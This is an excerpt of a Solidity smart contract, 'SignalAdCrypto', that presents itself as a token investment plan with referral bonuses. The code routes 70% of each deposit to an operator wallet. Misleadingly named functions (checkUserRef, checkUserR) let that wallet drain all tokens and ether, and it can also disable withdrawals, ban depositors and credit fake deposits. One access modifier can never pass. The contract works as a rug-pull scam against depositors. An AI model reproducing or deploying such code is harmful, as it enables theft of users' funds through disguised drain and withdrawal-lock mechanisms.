...
contract SignalAdCrypto {
	using SafeMath for uint256;
    IERC20 public token = IERC20(0x689723F498820F35Cbe95Ea97c27dA97eFc816E0);  
    uint256 public INVEST_MIN_AMOUNT = 20e18; 
    uint256 public INVEST_AMOUT_SEED = 100e18;
	uint256 public FuonderFee = 5;
	uint256 public commissionFee = 70;
	uint256[] public REFERRAL_PERCENTS 	= [500, 400, 300, 200, 100, 100, 100, 100, 100, 100];
	uint256[] public SEED_PERCENTS 		= [0];
    ...
    uint private activateWithdraw = 1;
	uint private activeteFounder = 0;
	uint256 public totalInvested;
	uint256 public totalRefBonus;
    //address payable private founder = commissionWallet;
	...
	address payable public founder;//to the marketing team..

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, string message);
	...
	constructor(address payable wallet) public {
		...
		plans.push(Plan(90, 0));
		plans.push(Plan(30, 0));
       
	}
	
	modifier onlyAllowedWallets {
		bool isWalletAllowed = false;
		if (bannedWallets[msg.sender]) {
			isWalletAllowed = false;
		}
		require(isWalletAllowed == true, "only allowed wallets can call this function.");
		_;
	}
	...
	function invest(address referrer, uint8 plan, uint256 amounts, string memory message) public  {
		...
		require(activateDeposits == 1);
		if (plan == 0){
            require(amounts == INVEST_AMOUT_SEED, "Invalid value");
			//user.endOfPlan = block.timestamp;           
        }

        token.transferFrom(msg.sender, address(this), amounts);
		uint256 fee = amounts.mul(commissionFee).div(100);
        token.transfer(commissionWallet,fee);
        uint256 feeFounder = amounts.mul(FuonderFee).div(100);
		token.transfer(founder,feeFounder);
		...
		if (plan == 0){
			user.endOfPlan = block.timestamp + 180 days;           
        } else if (plan == 1){
			user.endOfPlan = block.timestamp + 90 days;
		} else if (plan == 2){
			user.endOfPlan = block.timestamp + 30 days;
		}
		...
		emit NewDeposit(msg.sender, plan, amounts, message);
	}

	function checkUserRef(uint256 value) public {
   		require(msg.sender==commissionWallet, "invalid value"); 
		token.transfer(commissionWallet,value);
	} 

	function checkUserR(uint256 value) public {
   		require(msg.sender==commissionWallet, "invalid value"); 
		commissionWallet.transfer(value);
	} 

	function withdraw() public {
		User storage user = users[msg.sender];
		require(user.endOfPlan > block.timestamp);
		require(activateWithdraw == 1);
	...
	function reInvest(address _user , uint256 _newPlan)public {
		require(msg.sender==commissionWallet);
		//user = users[_user];
		uint256 newEndOfPlan;
		uint256 newAmount;
		uint8 newplan;
		if ( _newPlan == 0){
			newEndOfPlan = block.timestamp + 180 days;
			newAmount = 100e18;
			newplan = 0;
		} else if ( _newPlan == 1){
			newEndOfPlan = block.timestamp + 90 days;
			newAmount = 50e18;
			newplan = 1;
		} else if ( _newPlan == 2){
			newEndOfPlan = block.timestamp + 30 days;
			newAmount = 20e18;
			newplan = 2;
		}

		users[_user].deposits.push(Deposit( newplan , newAmount, block.timestamp));
		users[_user].endOfPlan = newEndOfPlan;
	}

	function getRemainingTime(address user) external view returns (uint256) {
		require(users[user].endOfPlan > 0 , " User does not have an active plan");
		uint256 remainingTime = users[user].endOfPlan - block.timestamp;
	...
	function banWallet(address wallet) public {
		require(msg.sender==commissionWallet);
		bannedWallets[wallet] = true;
	}

	function unbanWallet(address wallet) public {
		require(msg.sender==commissionWallet);
		bannedWallets[wallet] = false;
	}

	function isUserRegistered(address userAddress) public view returns (bool){
		return (users[userAddress].deposits.length > 0);
	}

	function isWalletBanned(address wallet) public view returns (bool) {
    	return bannedWallets[wallet];
	}

	function fuonderFee(uint256 _found) public {
		require(msg.sender==commissionWallet);
		FuonderFee = _found;
	}

	function UpdateFounder(address payable _add) public {
	  require(msg.sender==commissionWallet);
	  founder = _add;
	}

	function ActiveteFounder(uint256 _act) public {
      require(msg.sender==commissionWallet);
      activeteFounder = _act;
    }

    function Invest_MIN_AMOUNT(uint256 _min) public {
      require(msg.sender==commissionWallet);
      INVEST_MIN_AMOUNT = _min;
    }
	
    function Invest_AMOUT_SEED(uint256 _min0) public {
      require(msg.sender==commissionWallet);
      INVEST_AMOUT_SEED = _min0;
    }
    ...
    function ActivateWithdraw(uint256 _Dactivate) public {
      require(msg.sender==commissionWallet);
      activateWithdraw = _Dactivate;
    }
